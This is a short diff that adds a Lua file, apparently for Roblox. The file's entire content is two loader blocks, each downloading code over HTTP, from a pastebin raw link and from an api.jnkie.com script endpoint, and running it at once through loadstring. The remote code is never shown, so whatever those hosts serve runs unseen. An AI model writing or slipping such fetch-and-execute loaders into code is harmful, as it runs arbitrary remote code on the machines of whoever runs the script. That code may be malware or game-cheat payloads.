@@ -1,0 +1,7 @@
+task.spawn(function()
+  loadstring(game:HttpGet("https://pastebin.com/raw/EaGBtx5S"))()
+end)
+
+task.spawn(function()
+   loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/39a193e35260967850445433a07bc7d2797ba6f3c32bd708d5f74d3721bffd46/download"))()
+end)
